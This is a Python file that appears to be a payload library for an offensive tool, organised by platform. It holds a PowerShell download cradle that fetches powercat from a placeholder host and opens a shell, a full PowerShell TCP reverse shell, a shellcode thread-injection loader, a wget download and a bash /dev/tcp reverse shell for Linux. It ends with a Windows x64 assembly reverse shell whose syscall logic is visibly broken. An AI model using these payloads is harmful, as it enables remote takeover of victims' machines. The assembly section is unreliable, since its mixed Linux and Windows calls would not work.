#!/usr/bin/env python

packet = {
    "windows/x64" : {
        "ps1" : {
            "download" : """IEX(New-Object System.Net.WebClient).DownloadString('http://<ipaddress>/powercat.ps1');powercat -c <ipaddress> -p <port> -e powershell""",
            "revshell" : """$client = New-Object System.Net.Sockets.TCPClient('<ipaddress>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",
            "thread-injection" : """
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <shellcode>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
""",
        },

        "bat" : {},
        "vba" : {},
        "exe" : {}
     },

     "windows/x32" : {

     },

     "linux/x64" : {
         "sh" : { 
            "download" : "wget http://<ipaddress>:80/legit.sh -O legit.sh",
            "rev" : "bash -c 'bash -i >& /dev/tcp/<ipaddress>/<port> 0>&1'"
         },

         "exe" : {

         }
     },

     "linux/x32" : {

     }
}

assembly = {
   "windows" : {
      "x64" : {
         "10" : """
section .data
  server_ip db '<ip_address>'  ; Change this to your server's IP address
  server_port equ <port>        ; Change this to your desired port

section .text
  global _start

_start:
  ; Initialize Winsock
  xor rdx, rdx
  push rdx
  mov rax, 0x30                  ; WSAStartup function number
  lea rdi, [rdx + server_ip]
  mov rsi, rdi
  mov rdx, 0xFFFFFFFF
  mov rcx, 0x02
  call WinSockFunction

  ; Create socket
  mov rax, 0x20                  ; socket function number
  lea rdi, [rdx]
  mov rsi, 0x02                  ; AF_INET
  mov rdx, 0x01                  ; SOCK_STREAM
  mov ecx, 0x06                  ; IPPROTO_TCP
  call WinSockFunction

  ; Connect to server
  mov rax, 0x22                  ; connect function number
  lea rdi, [rdx]
  lea rsi, [rdx + server_ip]
  mov rdx, server_port
  call WinSockFunction

  ; Duplicate socket for stdin, stdout, and stderr
  xor rsi, rsi
  lea rdi, [rdx]
  mov rax, 0x33                  ; syscall number for dup2
  xor rdx, rdx
  call syscall

  mov rdi, rax
  lea rsi, [rdx + 0x1]           ; fd2
  mov rax, 0x33                  ; syscall number for dup2
  xor rdx, rdx
  call syscall

  mov rdi, rax
  lea rsi, [rdx + 0x2]           ; fd3
  mov rax, 0x33                  ; syscall number for dup2
  xor rdx, rdx
  call syscall

  ; Execute shell
  lea rdi, [rdx + shell_cmd]
  xor rsi, rsi
  xor rdx, rdx
  mov rax, 0x21                  ; syscall number for execve
  call syscall

  ; Exit
  mov rax, 0x4C                  ; syscall number for exit
  xor rdi, rdi                   ; exit code 0
  syscall

section .data
  shell_cmd db 'cmd.exe', 0

WinSockFunction:
  mov r10, rdx                   ; Save the current RDX value
  mov rdx, r8                    ; Move the fourth parameter to RDX
  mov r8, rcx                    ; Move the third parameter to R8
  mov rcx, rsi                   ; Move the second parameter to RCX
  mov rsi, rdi                   ; Move the first parameter to RSI
  mov rdi, r10                   ; Move the saved RDX value to RDI
  syscall
  ret

syscall:
  ; System call wrapper
  xor rax, rax                   ; Clear RAX register
  syscall
  ret
"""
      }
   }
}
